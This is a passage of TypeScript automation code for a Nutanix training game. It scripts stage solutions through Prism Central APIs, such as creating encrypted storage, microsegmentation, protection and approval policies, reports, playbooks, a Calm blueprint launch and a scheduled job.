        ctx.logger.info('actApplyCategoryToVm: category binding visible');
        return;
      }
    } catch (err) {
      ctx.logger.warn('actApplyCategoryToVm: poll failed (transient?)', {
        err: String(err).slice(0, 150),
      });
    }
  }
  ctx.logger.warn('actApplyCategoryToVm: category binding did not surface within 30 s');
}

/** Stage 17 create-storage-policy: creates `{Trigram}-sto-policy` with encryption enabled. */
async function actCreateStoragePolicy(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-sto-policy`;
  await ensure<AnyRec>({
    name: `storage-policy ${name}`,
    logger: ctx.logger,
    list: async () => listAllSdk(($p) => sdk(ctx).datapolicies.storage.listStoragePolicies($p)),
    match: (p) => p.name === name,
    create: async () =>
      (await postV4<{ data?: AnyRec }>(
        ctx,
        '/api/datapolicies/v4.2/config/storage-policies',
        {
          // encryptionState enum: $UNKNOWN | $REDACTED | ENABLED | SYSTEM_DERIVED.
          // `INLINE` was the compression state's value, not encryption's.
          name,
          encryptionSpec: { encryptionState: 'ENABLED' },
          compressionSpec: { compressionState: 'INLINE' },
          faultToleranceSpec: { replicationFactor: 'TWO' },
        },
      )).data,
  });
}

/** Stage 18 create-microseg-policy: creates `{Trigram}-mseg-policy` in ENFORCE mode. */
async function actCreateMicrosegPolicy(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-mseg-policy`;
  // Paginate: SDK default is 50 items; HPoC with 60+ categories makes
  // `{Trigram}-cat` fall off page 1 silently → no critical → empty rules
  // → microseg rejects with "Array is too short". `_limit: 100` covers
  // typical PC density; bump if any site exceeds.
  const cats = await listAllSdk<AnyRec>(($p) => sdk(ctx).prism.categories.listCategories($p));
  const critical = cats.find((c) => c.key === `${trigram}-cat` && c.value === 'Critical');
  if (!critical?.extId) {
    ctx.logger.warn(`actCreateMicrosegPolicy: {trigram}-cat:Critical missing, run create-category first`);
    return;
  }
  await ensure<AnyRec>({
    name: `microseg-policy ${name}`,
    logger: ctx.logger,
    list: async () => listAllSdk(($p) => sdk(ctx).microseg.policies.listNetworkSecurityPolicies($p)),
    match: (p) => p.name === name,
    create: async () =>
      (await postV4<{ data?: AnyRec }>(ctx, '/api/microseg/v4.0/config/policies', {
        // Shape confirmed against live `cur-mseg-policy`. Rules use
        // `securedGroupCategoryAssociatedEntityType` + `securedGroupCategoryReferences`
        // + `srcAllowSpec`/`destAllowSpec` + `isAllProtocolAllowed`. Scope is
        // `GLOBAL`, not `ALL_VLAN`.
        name,
        type: 'APPLICATION',
        state: 'ENFORCE',
        scope: 'GLOBAL',
        rules: [
          {
            description: 'default outbound',
            type: 'APPLICATION',
            spec: {
              '$objectType': 'microseg.v4.config.ApplicationRuleSpec',
              securedGroupCategoryAssociatedEntityType: 'VM',
              securedGroupCategoryReferences: [critical.extId],
              destAllowSpec: 'ALL',
              isAllProtocolAllowed: true,
            },
          },
          {
            description: 'default inbound (deny-all)',
            type: 'APPLICATION',
            spec: {
              '$objectType': 'microseg.v4.config.ApplicationRuleSpec',
              securedGroupCategoryAssociatedEntityType: 'VM',
              securedGroupCategoryReferences: [critical.extId],
              srcAllowSpec: 'NONE',
              isAllProtocolAllowed: false,
            },
          },
        ],
      })).data,
  });
  // Poll until the policy is queryable with state=ENFORCE. Microseg POST
  // is task-tracked: the policy lands in the list immediately but the
  // GET-by-id (which CheckSecurityPolicy uses to read rules) lags a few
  // seconds. Without this poll, auto-play submits Ok too early and the
  // check fails on the first attempt: operator sees `[✗] try again` then
  // `[✓]` on the second submit when state has finally caught up.
  const deadline = Date.now() + 20_000;
  while (Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, 1500));
    try {
      const list = await listAllSdk<AnyRec>(($p) =>
        sdk(ctx).microseg.policies.listNetworkSecurityPolicies($p),
      );
      const p = list.find((x) => x.name === name);
      if (p?.extId && /ENFORCE/i.test(String(p.state ?? ''))) {
        ctx.logger.info('actCreateMicrosegPolicy: policy ENFORCE visible');
        return;
      }
    } catch (err) {
      ctx.logger.warn('actCreateMicrosegPolicy: poll failed (transient?)', {
        err: String(err).slice(0, 150),
      });
    }
  }
  ctx.logger.warn('actCreateMicrosegPolicy: policy not ENFORCE-visible within 20 s');
}

/** Stage 19 allow-ssh-in-microseg: adds inbound-SSH rule to the existing microseg policy. */
async function actAllowSshInMicroseg(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-mseg-policy`;
  const policies = await listAllSdk<AnyRec>(($p) => sdk(ctx).microseg.policies.listNetworkSecurityPolicies($p));
  const found = policies.find((p) => p.name === name);
  if (!found?.extId) {
    ctx.logger.warn(`actAllowSshInMicroseg: policy ${name} missing, run create-microseg-policy first`);
    return;
  }
  // Fetch the full policy (list shape omits rules) so we can extend the rule set.
  const full = await getV4WithEtag<{ data?: AnyRec }>(
    ctx,
    `/api/microseg/v4.0/config/policies/${found.extId}`,
  );
  if (!full) {
    ctx.logger.warn('actAllowSshInMicroseg: could not GET policy for ETag');
    return;
  }
  const body = (full.body as AnyRec)?.data;
  const rules: AnyRec[] = Array.isArray(body?.rules) ? [...body.rules] : [];
  const frontendHost = String(ctx.vars.get('frontendHost') ?? '').trim();
  const coversSsh = (s: AnyRec) =>
    (s.tcpServices ?? []).some((t: AnyRec) => (t.startPort ?? 0) <= 22 && (t.endPort ?? 0) >= 22);
  // A correctly-restricted inbound SSH rule: covers tcp/22, scoped to a source
  // subnet, and NOT open to all sources: matches CheckSecurityPolicy2.
  const hasSsh = rules.some((r) => {
    const s = r.spec;
    if (!s || s.destAllowSpec) return false;
    if (s.srcAllowSpec === 'ALL') return false;
    return coversSsh(s) && Boolean(s.srcSubnet?.value);
  });
  const hasIcmp = rules.some((r) => (r.spec?.icmpServices ?? []).length > 0);
  if (hasSsh && hasIcmp) return;
  // `securedGroupCategoryAssociatedEntityType` + `securedGroupCategoryReferences`
  // must match the existing rules so the new rule binds to the same VMs.
  const critical = (rules[0]?.spec?.securedGroupCategoryReferences?.[0] as string) ?? '';
  if (!hasSsh) {
    // Inbound SSH locked to the frontend host only (the /ssh console's source
    // IP): scoped to tcp/22 via `tcpServices` + a /32 `srcSubnet`.
    rules.push({
      description: 'allow inbound SSH (22/tcp) from frontend host',
      type: 'APPLICATION',
      spec: {
        '$objectType': 'microseg.v4.config.ApplicationRuleSpec',
        securedGroupCategoryAssociatedEntityType: 'VM',
        securedGroupCategoryReferences: critical ? [critical] : [],
        srcSubnet: { value: frontendHost || '0.0.0.0', prefixLength: 32 },
        tcpServices: [{ startPort: 22, endPort: 22 }],
      },
    });
  }
  if (!hasIcmp) {
    // Mirrors the original game's stage-19 prompt: "ICMP (Type: 8 - Code: 0)
    // from anywhere". Encoded as an inbound rule with a single icmpServices
    // entry: the tightened CheckSecurityPolicy2 fails without it.
    rules.push({
      description: 'allow inbound ICMP (echo)',
      type: 'APPLICATION',
      spec: {
        '$objectType': 'microseg.v4.config.ApplicationRuleSpec',
        securedGroupCategoryAssociatedEntityType: 'VM',
        securedGroupCategoryReferences: critical ? [critical] : [],
        srcAllowSpec: 'ALL',
        icmpServices: [{ type: 8, code: 0 }],
      },
    });
  }
  try {
    await putV4(
      ctx,
      `/api/microseg/v4.0/config/policies/${found.extId}`,
      full.etag,
      { ...body, rules },
    );
  } catch (err) {
    ctx.logger.warn('actAllowSshInMicroseg: update failed', { err: String(err) });
  }
}

/** Stage 20 create-protection-policy: creates `{Trigram}-prot-policy` with
 * RPO=3600s, DAILY auto-rollup retention, scoped to `{Trigram}-cat:Critical`
 * (the tier the prompt names; CheckProtectionPolicy now requires `Critical`,
 * diverging from the Python check which rejected it). */
async function actCreateProtectionPolicy(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-prot-policy`;
  const clusters = await ctx.nutanix.rest.request<{ data?: Array<{ extId?: string }> }>(
    'GET',
    '/api/clustermgmt/v4.0/config/clusters',
  );
  const clusterUuid = clusters.data?.[0]?.extId;
  // replicationLocations require a `domainManagerExtId` (PC's own self-ref
  // for local replication). Pull it from /prism/v4.2/config/domain-managers.
  const domainManagers = await ctx.nutanix.rest.request<{
    data?: Array<{ extId?: string }>;
  }>('GET', '/api/prism/v4.2/config/domain-managers');
  const dmExtId = domainManagers.data?.[0]?.extId;
  if (!dmExtId) {
    ctx.logger.warn('actCreateProtectionPolicy: no domain-manager found');
    return;
  }
  // Bind the policy to the player's `{trigram}-cat:Critical` category, the
  // tier the prompt names, and what CheckProtectionPolicy now requires.
  const cats = await listAllSdk<AnyRec>(($p) => sdk(ctx).prism.categories.listCategories($p));
  const criticalCat = cats.find((c) => c.key === `${trigram}-cat` && c.value === 'Critical');
  if (!criticalCat?.extId) {
    ctx.logger.warn(`actCreateProtectionPolicy: ${trigram}-cat:Critical missing, run create-category first`);
    return;
  }
  await ensure<AnyRec>({
    name: `protection-policy ${name}`,
    logger: ctx.logger,
    list: async () => listAllSdk(($p) => sdk(ctx).datapolicies.protection.listProtectionPolicies($p)),
    match: (p) => p.name === name,
    create: async () =>
      (await postV4<{ data?: AnyRec }>(
        ctx,
        '/api/datapolicies/v4.2/config/protection-policies',
        {
          name,
          replicationLocations: [
            {
              label: 'local',
              isPrimary: true,
              domainManagerExtId: dmExtId,
              replicationSubLocation: {
                '$objectType': 'datapolicies.v4.config.NutanixCluster',
                clusterExtIds: clusterUuid ? [clusterUuid] : [],
              },
            },
          ],
          replicationConfigurations: [
            {
              sourceLocationLabel: 'local',
              schedule: {
                recoveryPointObjectiveTimeSeconds: 3600,
                recoveryPointType: 'CRASH_CONSISTENT',
                retention: {
                  '$objectType': 'datapolicies.v4.config.AutoRollupRetention',
                  local: { snapshotIntervalType: 'DAILY', frequency: 1 },
                },
              },
            },
          ],
          // Cluster v4 stores the binding as `categoryIds: [extId]`,
          // confirmed against an existing live `cur-prot-policy`. Sending
          // `categories: [{extId}]` is silently dropped.
          categoryIds: [criticalCat.extId],
        },
      )).data,
  });
}

/**
 * Stage 21 create-approval-policy: ensure the cluster-wide
 * `master-appr-policy` exists and is linked to the player's protection
 * policy. Two-phase :
 *
 *   1. Ensure the approval policy exists. Stage prose explicitly notes
 *      "this policy may already exist and only one approval policy is
 *      allowed", so we list first and reuse, only create when missing.
 *      Created with `charlie`/`thom`/`william` as approvers (from the
 *      ntnx-infiltration-game stock users). **Each approver must be the
 *      FULL `iam.v4.authn.User` object** (extId + idpId + displayName +
 *      firstName + lastName + status + emailId), not the minimal
 *      `{userType, username}` we initially tried: backend rejects the
 *      latter as "duplicate user details" because three users with only
 *      `{LOCAL, name}` and otherwise-default fields are indistinguishable
 *      to its dedup validator.
 *
 *   2. Link the player's protection policy via the
 *      `$actions/associate-policies` action: the `securedPolicies` field
 *      is read-only on the entity itself, so direct PUT can't set it.
 *      Idempotent: skip if already linked.
 */
async function actCreateApprovalPolicy(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = 'master-appr-policy';
  const protections = await listAllSdk<AnyRec>(($p) => sdk(ctx).datapolicies.protection.listProtectionPolicies($p));
  const myProt = protections.find((p) => p.name === `${trigram}-prot-policy`);
  if (!myProt?.extId) {
    ctx.logger.warn(
      `actCreateApprovalPolicy: protection-policy ${trigram}-prot-policy missing, run create-protection-policy first`,
    );
    return;
  }
  // Phase 1: ensure approval policy exists
  const existing = await listAllSdk<AnyRec>(($p) => sdk(ctx).security.approvals.listApprovalPolicies($p));
  let policy = existing.find((p) => p.name === name);
  if (!policy) {
    // Pull full User objects for the 3 stock approvers (charlie/thom/william).
    const users = await listAllSdk<AnyRec>(($p) => sdk(ctx).iam.users.listUsers($p));
    const approverUsernames = ['charlie', 'thom', 'william'];
    const approvers = approverUsernames
      .map((u) => users.find((x) => x.username === u))
      .filter(Boolean) as AnyRec[];
    if (approvers.length < 3) {
      ctx.logger.warn(
        `actCreateApprovalPolicy: stock approvers (charlie/thom/william) missing on this PC: found ${approvers.length}/3, skipping`,
      );
      return;
    }
    // Echo back every field the User schema exposes: backend validator
    // dedups on the union of (extId, idpId, username, displayName, names,
    // emailId) and rejects bodies that look like clones of each other.
    const approverFull = approvers.map((u) => ({
      userType: u.userType,
      username: u.username,
      extId: u.extId,
      idpId: u.idpId,
      displayName: u.displayName,
      firstName: u.firstName,
      lastName: u.lastName,
      status: u.status,
      emailId: u.emailId,
    }));
    const created = await postV4<{ data?: AnyRec }>(
      ctx,
      '/api/security/v4.1/management/approval-policies',
      {
        name,
        description: 'Master approval policy for Protection operations',
        approverGroups: [{ name: 'tank-appr-set', approvers: approverFull, expiryHours: 24 }],
      },
    );
    // Create returns a task ref: re-list to pick up the freshly-minted
    // policy's extId. v4 task is async but typically settles in <2 s.
    await new Promise((r) => setTimeout(r, 2000));
    const refreshed = await listAllSdk<AnyRec>(($p) => sdk(ctx).security.approvals.listApprovalPolicies($p));
    policy = refreshed.find((p) => p.name === name);
    if (!policy) {
      ctx.logger.warn('actCreateApprovalPolicy: post-create list still missing the policy', {
        taskRef: created?.data,
      });
      return;
    }
    ctx.logger.info(`act create: approval-policy ${name}`, { extId: policy.extId });
  }
  // Phase 2: associate the player's protection policy. Idempotent: skip
  // if already in securedPolicies.
  const alreadyLinked = (policy.securedPolicies ?? []).some(
    (sp: AnyRec) => sp.policyExtId === myProt.extId,
  );
  if (alreadyLinked) {
    ctx.logger.info(`act noop: approval-policy already linked to ${myProt.name}`);
    return;
  }
  if (!policy.extId) {
    ctx.logger.warn('actCreateApprovalPolicy: existing policy has no extId, cannot associate');
    return;
  }
  try {
    await postV4Action(
      ctx,
      `/api/security/v4.1/management/approval-policies/${policy.extId}`,
      '$actions/associate-policies',
      {
        securedPolicies: [
          { policyExtId: myProt.extId, policyType: 'PROTECTION_POLICY' },
        ],
      },
    );
    ctx.logger.info(`act associate: ${myProt.name} → master-appr-policy`);
  } catch (err) {
    ctx.logger.warn('actCreateApprovalPolicy: associate-policies failed', {
      err: String(err).slice(0, 200),
    });
  }
}

/** Stage 26 restore-vm-from-recovery: re-creates `{Trigram}-vm` after the incident. Minimal spec; a real replay would restore from a recovery point. */
async function actRestoreVmFromRecovery(ctx: ActContext): Promise<void> {
  // Delegates to the create-vm act: the check only asserts the VM exists again.
  await actCreateVm(ctx);
}

/** Stage 27 create-report: creates `{Trigram}-report` with a DAILY
 * schedule, recipient `{Trigram}{EmailReport}`, and one VM-list widget,
 * matching what Python `CheckReport` (CheckLabs.py) asserts. Field shapes
 * confirmed against an existing live `cur-report` (`schedule`,
 * `notificationPolicy.recipients[].emailAddress`,
 * `sections[].rows[].widgets[].widgetInfo` with `entityType: 'VM'`). */
async function actCreateReport(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-report`;
  const emailSuffix = getVarString(ctx, 'EmailReport');
  const recipientEmail = emailSuffix ? `${trigram}${emailSuffix}` : `${trigram}@example.com`;
  await ensure<AnyRec>({
    name: `report-config ${name}`,
    logger: ctx.logger,
    list: async () => listAllSdk(($p) => sdk(ctx).opsmgmt.reportConfigs.listReportConfigs($p)),
    match: (r) => r.name === name,
    create: async () =>
      (await postV4<{ data?: AnyRec }>(
        ctx,
        '/api/opsmgmt/v4.0/config/report-configs',
        {
          name,
          description: `Seeded ${name}`,
          supportedFormats: ['PDF'],
          timezone: 'UTC',
          // DAILY schedule (Python: schedule.interval_type == 'DAILY').
          schedule: {
            '$objectType': 'opsmgmt.v4.config.ReportSchedule',
            scheduleInterval: 'DAILY',
            frequency: 1,
            startTime: new Date(Date.now() + 60_000).toISOString(),
          },
          // Recipient = `{Trigram}{EmailReport}` (Python check requires
          // first recipient match this exact value).
          notificationPolicy: {
            '$objectType': 'opsmgmt.v4.config.NotificationPolicy',
            recipientFormats: ['PDF'],
            recipients: [
              {
                '$objectType': 'opsmgmt.v4.config.Recipient',
                emailAddress: recipientEmail,
              },
            ],
          },
          // One VM-list widget: Python check walks `template_rows` looking
          // for `widget_config.entity_type == 'vm'`. v4 calls the field
          // `entityType` on `widgetInfo`. Minimal column set; the player's
          // UI flow lets them tweak fields later.
          sections: [
            {
              '$objectType': 'opsmgmt.v4.config.Section',
              name: 'VM inventory',
              rows: [
                {
                  '$objectType': 'opsmgmt.v4.config.Row',
                  widgets: [
                    {
                      // `$widgetInfoItemDiscriminator` is server-generated
                      // on GET but rejected on POST as "unsupported": only
                      // `$objectType` on the inner widgetInfo is needed for
                      // the discriminator resolution at create time.
                      '$objectType': 'opsmgmt.v4.config.Widget',
                      widgetInfo: {
                        // `WidgetConfig` requires `size` + `type` per
                        // schema (DATA_TABLE for a tabular VM list).
                        // EntityType is upper-case enum value.
                        '$objectType': 'opsmgmt.v4.config.WidgetConfig',
                        type: 'DATA_TABLE',
                        size: 'FULLSPAN',
                        entityType: 'VM',
                        heading: 'List of VMs',
                        fields: [
                          { '$objectType': 'opsmgmt.v4.config.WidgetField', label: 'Name', name: 'vm_name' },
                          { '$objectType': 'opsmgmt.v4.config.WidgetField', label: 'Power State', name: 'power_state' },
                        ],
                        dataCriteria: {
                          '$objectType': 'opsmgmt.v4.config.DataCriteria',
                          sortColumn: 'vm_name',
                          sortOrder: 'ASCENDING',
                        },
                      },
                    },
                  ],
                },
              ],
            },
          ],
        },
      )).data,
  });
}

/** Stage 33 create-ncm-playbook: creates `{Trigram}-playbook` (v3 action_rule, XPLAY). */
async function actCreateNcmPlaybook(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const name = `${trigram}-playbook`;
  const existing = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
    'POST',
    '/api/nutanix/v3/action_rules/list',
    { length: 250 },
  );
  if (existing.entities?.some((p) => p.status?.name === name || p.status?.resources?.name === name)) {
    return;
  }
  // v3 action_rules: `spec` must contain only `resources` (no top-level
  // `name`/`description`). action_type / action_trigger_type UUIDs differ
  // across PC versions (the previously-hardcoded PC 2024.3 values broke
  // silently on PC 7.5: POST 2xx-accepts but the rule never indexes,
  // /list comes back empty), so look them up by name from the registry.
  const triggerTypes = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
    'POST',
    '/api/nutanix/v3/action_trigger_types/list',
    { length: 250 },
  );
  const eventTriggerUuid = triggerTypes.entities?.find(
    (t) => t.status?.name === 'event_trigger' || t.status?.resources?.name === 'event_trigger',
  )?.metadata?.uuid;
  const actionTypes = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
    'POST',
    '/api/nutanix/v3/action_types/list',
    { length: 250 },
  );
  const emailActionUuid = actionTypes.entities?.find(
    (t) => t.status?.name === 'email_action' || t.status?.resources?.name === 'email_action',
  )?.metadata?.uuid;
  if (!eventTriggerUuid || !emailActionUuid) {
    throw new Error(
      `actCreateNcmPlaybook: PC registry missing types: event_trigger=${eventTriggerUuid ?? '?'} email_action=${emailActionUuid ?? '?'}`,
    );
  }
  ctx.logger.info(`act create: playbook ${name}`);
  await ctx.nutanix.rest.request('POST', '/api/nutanix/v3/action_rules', {
    spec: {
      // v3 action_rules' `spec` only carries `resources`: no top-level
      // name/description (those live in `metadata` and in resources).
      resources: {
        name,
        description: `Seeded playbook for ${trigram}`,
        is_enabled: true,
        rule_type: 'XPLAY',
        // Stage 33 prose: "email-on-VM-power-cycle rule". Trigger type is
        // `event_trigger` with `input_parameter_values.type = 'VmPowerCycleAudit'`.
        // The original Python CheckPlaybook validates exactly this.
        trigger_list: [
          {
            instance_uuid: crypto.randomUUID(),
            action_trigger_type_reference: {
              kind: 'action_trigger_type',
              name: 'event_trigger',
              uuid: eventTriggerUuid,
            },
            input_parameter_values: { type: 'VmPowerCycleAudit' },
          },
        ],
        action_list: [
          {
            instance_uuid: crypto.randomUUID(),
            should_continue_on_failure: false,
            max_retries: 2,
            child_action_uuids: [],
            action_type_reference: {
              kind: 'action_type',
              name: 'email_action',
              uuid: emailActionUuid,
            },
            input_parameter_values: {
              subject: `Playbook ${name} fired`,
              message_body: 'Seeded test playbook ran.',
            },
          },
        ],
      },
    },
    metadata: { kind: 'action_rule', name },
    api_version: '3.1',
  });
  // v3 POSTs are task-tracked: the playbook shows up in /list a few
  // seconds after the create succeeds. Poll up to 60 s so the very next
  // CheckPlaybook doesn't race against the indexing lag.
  const deadline = Date.now() + 60_000;
  while (Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, 3_000));
    const list = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
      'POST',
      '/api/nutanix/v3/action_rules/list',
      { length: 250 },
    );
    if (list.entities?.some((p) => p.status?.name === name || p.status?.resources?.name === name)) {
      ctx.logger.info(`act playbook ${name} visible`);
      return;
    }
  }
  throw new Error(`actCreateNcmPlaybook: playbook ${name} did not appear within 60 s after POST`);
}

/** Stage 35 clone-app-blueprint: launches `CloneProd` blueprint as `{Trigram}-app`. */
async function actCloneAppBlueprint(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const appName = `${trigram}-app`;
  const existing = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
    'POST',
    '/api/nutanix/v3/apps/list',
    { length: 250 },
  );
  const expectedVpcEarly = `${trigram}-vpc`;
  if (existing.entities?.some((a) => a.status?.name === appName || a.metadata?.name === appName)) {
    // App already exists from a prior call. The check ALSO requires the
    // runtime-created VPC; a re-fire after the launch but before the
    // runbook finished should wait for VPC, not return blindly.
    const earlyDeadline = Date.now() + 220_000;
    while (Date.now() < earlyDeadline) {
      const vpcs = await ctx.nutanix.rest.request<{ data?: AnyRec[] }>(
        'GET',
        '/api/networking/v4.0/config/vpcs?%24limit=100',
      );
      if ((vpcs.data ?? []).find((v) => v.name === expectedVpcEarly)) {
        ctx.logger.info(`act noop: app ${appName} + vpc ${expectedVpcEarly} already present`);
        return;
      }
      ctx.logger.info(`act waiting: app ${appName} present but vpc ${expectedVpcEarly} not yet`);
      await new Promise((r) => setTimeout(r, 8_000));
    }
    throw new Error(
      `actCloneAppBlueprint: app ${appName} exists but vpc ${expectedVpcEarly} did not materialize`,
    );
  }
  const bps = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
    'POST',
    '/api/nutanix/v3/blueprints/list',
    { length: 250, filter: 'name==CloneProd' },
  );
  const bp = bps.entities?.find((b) => b.status?.name === 'CloneProd');
  if (!bp?.metadata?.uuid) {
    ctx.logger.warn('actCloneAppBlueprint: CloneProd blueprint not found');
    return;
  }
  // v3 has TWO launch endpoints with different schemas :
  //   - `/launch`        : accepts `application_name` only, REJECTS
  //                       `runtime_editables` (422 "Additional properties
  //                       not allowed").
  //   - `/simple_launch` : bare `{spec:{...}}` envelope (no api_version /
  //                       metadata), accepts `app_name` + `app_profile_
  //                       reference` + `runtime_editables.variable_list`.
  // We need runtime variables (the blueprint takes 5: vpcName /
  // categoryName / categoryValue / externalNetworkName /
  // categoryFloatingIPName) so `/simple_launch` is the right path.
  const full = await ctx.nutanix.rest.request<AnyRec>(
    'GET',
    `/api/nutanix/v3/blueprints/${bp.metadata.uuid}`,
  );
  const profile = full?.spec?.resources?.app_profile_list?.[0];
  if (!profile?.uuid) {
    ctx.logger.warn('actCloneAppBlueprint: CloneProd blueprint has no app_profile');
    return;
  }
  // Stage 35 prose has the player update the blueprint's `pcUser` credential
  // BEFORE launching. The bake-in default on the source CloneProd
  // blueprint has `username: "admin2"` (a placeholder that doesn't exist on
  // any HPoC): runbook tasks then auth as admin2 and fail with
  // `401 Invalid Credentials` on the very first SDK call (e.g. list_subnets
  // when creating the VPC). We MUST patch both `username` and `secret` to
  // match the operator's `PCUser`/`PCPassword` env. Without this, the
  // launch is accepted, deployment runs, runbook explodes on auth → app
  // ends up in `error` state with no VPC, no VM, nothing useful.
  const pcUser = getVarString(ctx, 'PCUser');
  const pcPassword = getVarString(ctx, 'PCPassword');
  if (pcUser && pcPassword) {
    const creds = full.spec?.resources?.credential_definition_list ?? [];
    const pcCred = creds.find((c: AnyRec) => c.name === 'pcUser');
    if (pcCred) {
      pcCred.username = pcUser;
      pcCred.secret = {
        value: pcPassword,
        attrs: { is_secret_modified: true },
      };
      try {
        await ctx.nutanix.rest.request(
          'PUT',
          `/api/nutanix/v3/blueprints/${bp.metadata.uuid}`,
          {
            api_version: full.api_version ?? '3.1',
            metadata: full.metadata,
            spec: full.spec,
          },
        );
        ctx.logger.info('actCloneAppBlueprint: pcUser credential refreshed', {
          username: pcUser,
        });
      } catch (err) {
        ctx.logger.warn('actCloneAppBlueprint: credential refresh failed', {
          err: String(err).slice(0, 200),
        });
      }
    }
  }
  // Calm rejects minimal `{name, value}` runtime variable entries: the
  // launch sticks in `state: running` with `milestone: null` forever
  // (validator can't match a variable by `name` alone). Pull the FULL
  // variable definitions (uuid + type + context) from the
  // `/runtime_editables` sub-endpoint and echo them back with just the
  // `value` patched per stage 35 prose. CategoryFloatingIPName is "we
  // don't care" per the prose but the schema still requires a value.
  const re = await ctx.nutanix.rest.request<{
    resources?: Array<{ runtime_editables?: { variable_list?: AnyRec[] } }>;
  }>('GET', `/api/nutanix/v3/blueprints/${bp.metadata.uuid}/runtime_editables`);
  const declared = re.resources?.[0]?.runtime_editables?.variable_list ?? [];
  const valueByName: Record<string, string> = {
    vpcName: `${trigram}-vpc`,
    categoryName: 'Environment',
    categoryValue: 'Production',
    externalNetworkName: 'TestNetwork',
    categoryFloatingIPName: 'Quarantine',
  };
  const variableList = declared.map((v) => ({
    ...v,
    value: { value: valueByName[v.name as string] ?? '' },
  }));
  ctx.logger.info(`act create: app ${appName} (Calm launch)`);
  await ctx.nutanix.rest.request(
    'POST',
    `/api/nutanix/v3/blueprints/${bp.metadata.uuid}/simple_launch`,
    {
      spec: {
        app_name: appName,
        app_profile_reference: {
          kind: 'app_profile',
          uuid: profile.uuid,
          name: profile.name ?? 'Default',
        },
        runtime_editables: { variable_list: variableList },
      },
    },
  );
  // Calm launch is the slowest act: the runbook spins up a VPC, runs
  // tasks, etc. The check requires BOTH the app entry AND the runtime-
  // created `{Trigram}-vpc` to exist. App appears in /list ~5–30 s after
  // launch; VPC only materializes after the runbook completes (~2–5 min).
  // Cap the wait below Bun's idleTimeout (255 s max) so the response
  // writes back before the connection closes: operator can re-fire if
  // Calm needs more than this budget.
  const expectedVpc = `${trigram}-vpc`;
  const deadline = Date.now() + 220_000;
  while (Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, 8_000));
    const apps = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
      'POST',
      '/api/nutanix/v3/apps/list',
      { length: 250 },
    );
    const appEntry = apps.entities?.find(
      (a) => a.status?.name === appName || a.metadata?.name === appName,
    );
    if (!appEntry) continue;
    const vpcs = await ctx.nutanix.rest.request<{ data?: AnyRec[] }>(
      'GET',
      '/api/networking/v4.0/config/vpcs?%24limit=100',
    );
    if ((vpcs.data ?? []).find((v) => v.name === expectedVpc)) {
      ctx.logger.info(`act app ${appName} + vpc ${expectedVpc} visible`);
      return;
    }
  }
  throw new Error(
    `actCloneAppBlueprint: app ${appName} or vpc ${expectedVpc} did not settle within 4 min`,
  );
}

/**
 * Stage 36 schedule-day2-action: schedules a daily run on the player's
 * `{Trigram}-app`. Calm v3 models scheduled actions as `job` entities at
 * `POST /api/nutanix/v3/jobs` (NOT `/api/nutanix/v3/app_scheduler` which
 * 404s: that was an early wrong guess). Original Python `CheckSchedDay2`
 * confirms via `entities[?(metadata.name=='{trigram}-sched')].resources`
 * with `executable.entity.uuid == AppUUID`.
 *
 * Body shape pinned through trial & error against the live PC:
 *   - resources.type: 'RECURRING'
 *   - resources.schedule_info: ONE OF { execution_time } (one-time) OR
 *     { schedule } (recurring cron). Both → 422 "valid under each schema".
 *     We use `schedule: '0 3 * * *'` for daily-3am.
 *   - resources.executable.entity.uuid: the launched app's UUID
 *   - resources.executable.action: `{}` is accepted, the check only
 *     validates entity match, the action details (per-app runbook UUID
 *     for "Refresh VM") aren't part of the live check assertion.
 *
 * Idempotent: skips when {trigram}-sched already exists.
 */
async function actScheduleDay2Action(ctx: ActContext): Promise<void> {
  const trigram = getTrigram(ctx);
  if (!trigram) return;
  const schedName = `${trigram}-sched`;
  const existing = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
    'POST',
    '/api/nutanix/v3/jobs/list',
    { kind: 'job', length: 250 },
  );
  if (
    existing.entities?.some(
      (s) => s.status?.name === schedName || s.metadata?.name === schedName,
    )
  ) {
    ctx.logger.info(`act noop: schedule ${schedName} already exists`);
    return;
  }
  const apps = await ctx.nutanix.rest.request<{ entities?: AnyRec[] }>(
    'POST',
    '/api/nutanix/v3/apps/list',
    { kind: 'app', length: 250 },
  );
  const app = apps.entities?.find((a) => a.status?.name === `${trigram}-app`);
  if (!app?.metadata?.uuid) {
    ctx.logger.warn(
      'actScheduleDay2Action: player app not found, run clone-app-blueprint first',
    );
    return;
  }
  try {
    await ctx.nutanix.rest.request('POST', '/api/nutanix/v3/jobs', {
      api_version: '3.1',
      metadata: { kind: 'job', name: schedName },
      resources: {
        name: schedName,
        description: 'Daily Refresh VM (registered for stage 36)',
        type: 'RECURRING',
        schedule_info: { schedule: '0 3 * * *', time_zone: 'UTC' },
        executable: {
          entity: { uuid: app.metadata.uuid },
          action: {},
        },
      },
    });
    ctx.logger.info(`act create: schedule ${schedName} → app ${app.metadata.uuid}`);
  } catch (err) {
    ctx.logger.warn('actScheduleDay2Action: jobs POST failed', {
      err: String(err).slice(0, 200),
    });
  }
}

/**
 * Stage 37 modify-blueprint: adds a `foo` task to `bp-blankvm-prd{Vlanid}`'s
 * NewVM `action_create` action. The blueprint isn't pre-deployed on every
 * HPoC; the original Python's `DeployBP` action (`actions.py` in
